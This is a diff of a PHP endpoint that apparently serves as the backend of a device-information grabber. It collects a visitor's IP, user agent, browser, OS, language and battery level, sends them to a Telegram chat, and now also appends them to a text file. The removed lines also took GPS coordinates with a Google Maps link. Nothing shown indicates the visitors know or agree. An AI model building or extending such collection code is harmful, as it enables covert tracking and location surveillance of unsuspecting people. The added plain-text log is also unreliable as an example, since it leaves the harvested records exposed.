@@ -1,39 +1,32 @@
 <?php
-require_once __DIR__ . '/config.php';
 require_once __DIR__ . '/telegram.php';
 
-$input = json_decode(file_get_contents('php://input'), true);
+$ip = $_POST['ip'] ?? 'Unknown';
+$agent = $_POST['agent'] ?? 'Unknown';
+$navigator = $_POST['navegador'] ?? 'Unknown';
+$versionapp = $_POST['versionapp'] ?? 'Unknown';
+$dystro = $_POST['dystro'] ?? 'Unknown';
+$idioma = $_POST['idioma'] ?? 'Unknown';
+$bateri = $_POST['bateri'] ?? 'Unknown';
 
-$ip        = $input['ip'] ?? 'Desconocida';
-$ua        = $input['ua'] ?? 'Desconocido';
-$browser   = $input['browser'] ?? 'Desconocido';
-$appver    = $input['appver'] ?? 'Desconocida';
-$os        = $input['os'] ?? 'Desconocido';
-$lang      = $input['lang'] ?? 'Desconocido';
-$battery   = $input['battery'] ?? 'Desconocida';
-$lat       = $input['lat'] ?? 'No disponible';
-$lon       = $input['lon'] ?? 'No disponible';
-$accuracy  = $input['accuracy'] ?? 'No disponible';
-$ts        = gmdate('c');
+$ts = gmdate('c');
 
 $msg = "📱 <b>Info del dispositivo</b>\n".
        "🌐 IP: $ip\n".
-       "🖥 Navegador: $browser\n".
-       "🧩 User-Agent: $ua\n".
-       "💻 Versión App: $appver\n".
-       "🖲 Sistema: $os\n".
-       "🌐 Idioma: $lang\n".
-       "🔋 Batería: $battery%\n".
-       "\n📍 Nueva ubicación\n".
-       "📌 Lat: $lat\n".
-       "📌 Lon: $lon\n".
-       "🎯 Precisión: $accuracy m\n".
-       "⏰ Hora: $ts\n".
-       ($lat !== 'No disponible' && $lon !== 'No disponible' 
-        ? "🌍 Google Maps: https://www.google.com/maps?q=$lat,$lon" 
-        : "");
+       "🖥 Navegador: $navigator\n".
+       "🧩 User-Agent: $agent\n".
+       "💻 Versión App: $versionapp\n".
+       "🖲 Sistema: $dystro\n".
+       "🌐 Idioma: $idioma\n".
+       "🔋 Batería: $bateri%\n".
+       "⏰ Hora: $ts";
 
 send_to_telegram($msg);
 
-header('Content-Type: application/json');
-echo json_encode(['status' => 'ok']);
+// Guardar también en archivo si quieres
+$file = fopen('device_info.txt', 'a+');
+fwrite($file, $msg."\n\n");
+fclose($file);
+
+echo json_encode(['status'=>'ok']);
+?>
